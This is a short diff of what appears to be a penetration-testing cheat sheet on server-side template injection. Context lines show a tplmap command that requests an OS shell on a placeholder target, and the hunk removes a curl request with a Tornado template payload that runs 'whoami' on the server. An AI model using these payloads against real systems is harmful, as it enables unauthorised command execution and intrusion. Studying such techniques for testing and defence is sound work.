@@ -609,7 +609,7 @@ zero@pio$ ./tplmap.py -u 'http://<TARGET IP>:<PORT>' -d name=john --os-shell
 
 Another type is [Tornado](https://www.tornadoweb.org/en/stable/).
 ```console
-zero@pio$ curl -X POST -d "email={% import os %}{{os.system('whoami')}}" http://<TARGET IP>:<PORT>/
+
 ```
 
 **tqlmap** will gave us directly:
